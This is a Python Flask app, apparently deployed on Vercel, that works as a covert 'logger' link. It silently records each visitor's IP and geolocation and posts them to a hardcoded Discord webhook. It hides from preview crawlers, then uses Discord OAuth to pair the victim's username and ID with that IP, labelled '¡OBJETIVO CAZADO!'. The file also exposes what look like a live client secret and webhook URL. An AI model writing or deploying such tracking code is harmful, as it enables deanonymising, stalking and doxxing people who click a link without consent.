import os
from flask import Flask, render_template, request, redirect
import requests
from datetime import datetime

# Rutas para Vercel
current_dir = os.path.dirname(os.path.abspath(__file__))
template_dir = os.path.join(current_dir, '..', 'templates')
app = Flask(__name__, template_folder=template_dir)

# --- CONFIGURACIÓN (RELLENA ESTO) ---
CLIENT_ID     = "1457527346687901812"
CLIENT_SECRET = "8NXd3i8r1QXproq-MMf8EqW_BJOujcPR"
REDIRECT_URI  = "https://logger-page-g0oldyv1y-ola950857gmailcoms-projects.vercel.app/callback" # Tu URL de Vercel
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1456993989306749133/2JG3BvXA__irPAOcgx-R-lTPC7n7ScgWSgUl0jMmnR-staCUFK0b0upG2LwDHfck1ean"
AVATAR_URL = "https://i.pinimg.com/736x/10/e3/f5/10e3f51d11ef13d5c88cb329211146ba.jpg"

def is_bot(ua):
    bots = ['vercel', 'screenshot', 'bot', 'crawler', 'spider', 'discord', 'telegram']
    return any(bot in ua.lower() for bot in bots)

def get_client_ip():
    ip = request.headers.get('x-forwarded-for')
    if ip and ',' in ip: ip = ip.split(',')[0].strip()
    if not ip: ip = request.headers.get('x-real-ip')
    if not ip: ip = request.remote_addr
    return ip

@app.route('/')
def index():
    user_agent = request.headers.get('user-agent', 'Desconocido')
    if is_bot(user_agent): return render_template('index.html')

    # --- PASO 1: CAPTURA INVISIBLE DE IP ---
    ip = get_client_ip()
    try:
        geo = requests.get(f"https://ipapi.co/{ip}/json/", headers={'User-Agent': 'Mozilla/5.0'}, timeout=5).json()
    except: geo = {"ip": ip}

    payload_visit = {
        "username": "1* Tracker - Visita",
        "avatar_url": AVATAR_URL,
        "embeds": [{
            "title": "👁️ Alguien ha entrado al link",
            "color": 0xFFA500,
            "fields": [
                {"name": "🌐 IP Pública", "value": f"**`{ip}`**", "inline": True},
                {"name": "📍 Ubicación", "value": f"{geo.get('city')}, {geo.get('country_name')}", "inline": True},
                {"name": "📱 Browser", "value": f"```\n{user_agent[:100]}...\n```", "inline": False}
            ],
            "footer": {"text": "al3xg0nzalezzz • Captura Automática"}
        }]
    }
    requests.post(DISCORD_WEBHOOK_URL, json=payload_visit)

    auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify"
    return render_template('index.html', auth_url=auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code: return redirect("https://discord.gg/nUy6Vjr9YU")

    try:
        # Intercambiar código por Token
        data = {'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI}
        r_token = requests.post("https://discord.com/api/v10/oauth2/token", data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        token = r_token.json().get('access_token')

        # Obtener datos de Discord
        user = requests.get("https://discord.com/api/v10/users/@me", headers={'Authorization': f'Bearer {token}'}).json()
        ip = get_client_ip()

        # --- PASO 2: MENSAJE CONJUNTO (DISCORD + IP) ---
        payload_full = {
            "username": "1* Tracker - IDENTIDAD",
            "avatar_url": AVATAR_URL,
            "embeds": [{
                "title": "🎯 ¡OBJETIVO CAZADO!",
                "color": 0xFF0044,
                "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png" if user.get('avatar') else AVATAR_URL},
                "fields": [
                    {"name": "👤 Usuario Discord", "value": f"**{user['username']}**", "inline": True},
                    {"name": "🆔 Discord ID", "value": f"`{user['id']}`", "inline": True},
                    {"name": "🌐 IP Vinculada", "value": f"**`{ip}`**", "inline": False},
                    {"name": "🔗 Invitación", "value": "[Click para entrar](https://discord.gg/nUy6Vjr9YU)", "inline": False}
                ],
                "footer": {"text": "al3xg0nzalezzz • Registro Completo", "icon_url": AVATAR_URL}
            }]
        }
        requests.post(DISCORD_WEBHOOK_URL, json=payload_full)
    except: pass

    return redirect("https://discord.gg/nUy6Vjr9YU")

app_dispatch = app
